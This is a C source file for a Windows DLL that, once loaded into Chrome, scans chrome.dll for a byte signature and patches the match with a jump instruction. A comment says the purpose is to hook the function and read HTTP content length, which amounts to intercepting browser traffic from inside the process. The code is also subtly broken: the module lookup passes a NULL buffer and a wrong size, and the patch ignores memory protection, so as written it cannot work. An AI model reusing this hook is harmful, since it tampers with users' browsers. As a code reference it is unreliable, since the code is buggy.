#include <Windows.h>
#include <stdio.h>
#include <tchar.h>
#include <Psapi.h>

#pragma comment(lib, "Psapi.lib")

#define TARGET_MODULE "chrome.dll"
#define DONT_KILL_INTEL 2

#define SIG "\x48\x8B\xC4\x48\x89\x58\x10\x48\x89\x68\x18\x48\x89\x70\x20\x57\x41\x56\x41\x57\x48\x00\x00\x00\x00\x00\x00\x48\x8B\xE9\x4C\x8D\x05\x43\x36\xC2\x01"
#define MASK "xxxxxxxxxxxxxxxxxxxxx??????xxxxxxxxxx"

void mainThread();


BOOLEAN WINAPI DllMain(IN HINSTANCE hDllHandle,
	IN DWORD     nReason,
	IN LPVOID    Reserved)
{
	BOOLEAN bSuccess = TRUE;


	//  Perform global initialization.

	switch (nReason)
	{
	case DLL_PROCESS_ATTACH:

		//  For optimization.

		DisableThreadLibraryCalls(hDllHandle);
		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)mainThread, NULL, NULL, NULL);
		break;

	case DLL_PROCESS_DETACH:

		break;
	}

	return bSuccess;

}
//  end DllMain

LPMODULEINFO FindModule();
uintptr_t findPattern(char* base, unsigned int size, char* pattern, char *mask);

void mainThread() {
	LPMODULEINFO chromeDllModule = NULL;
	do {
		chromeDllModule = FindModule();
		Sleep(DONT_KILL_INTEL);
	} while (!chromeDllModule);

	char * ptrToFunc = (char*)findPattern((char*)chromeDllModule->lpBaseOfDll, chromeDllModule->SizeOfImage, SIG, MASK);
	/*hook ptr and view [rdx+10] to parse content length*/
	*(ptrToFunc) = 0xff;
	*(ptrToFunc + 1) = 0xe0;

}


LPMODULEINFO FindModule()
{
	HMODULE hMods[1024];
	HANDLE hProcess;
	DWORD cbNeeded;
	LPMODULEINFO result = NULL;
	unsigned int i;

	// Get a handle to the process.

	hProcess = GetCurrentProcess();
	if (NULL == hProcess)
		return NULL;

	// Get a list of all the modules in this process.

	if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
	{
		for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
		{
			char nameBuf[MAX_PATH];
			if (!GetModuleBaseName(hProcess, hMods[i], nameBuf, MAX_PATH)) {
				printf("unable to get module name\n");
				continue;
			}

			if (strcmp(nameBuf, TARGET_MODULE)) {
				continue;
			}

			LPMODULEINFO moduleInfo = NULL;
			if (!GetModuleInformation(hProcess, hMods[i], moduleInfo, sizeof(LPMODULEINFO))) {
				printf("unable to get module info for module \n");
				continue;
			}
			result = moduleInfo;
			break;
		}
	}

	// Release the handle to the process.

	CloseHandle(hProcess);

	return result;
}

//Internal Pattern scan, external pattern scan is just a wrapper around this
uintptr_t findPattern(char* base, unsigned int size, char* pattern, char *mask)
{
	size_t patternLength = strlen(mask);

	for (uintptr_t i = 0; i < size - patternLength; i++)
	{
		bool found = true;
		for (uintptr_t j = 0; j < patternLength; j++)
		{
			if (mask[j] != '?' && pattern[j] != *(char*)(base + i + j))
			{
				found = false;
				break; // yeah that's right, stop iterating when pattern is bad.  Looking at you fleep...
			}
		}

		if (found)
		{
			return (uintptr_t)base + i;
		}
	}
	return 0;
}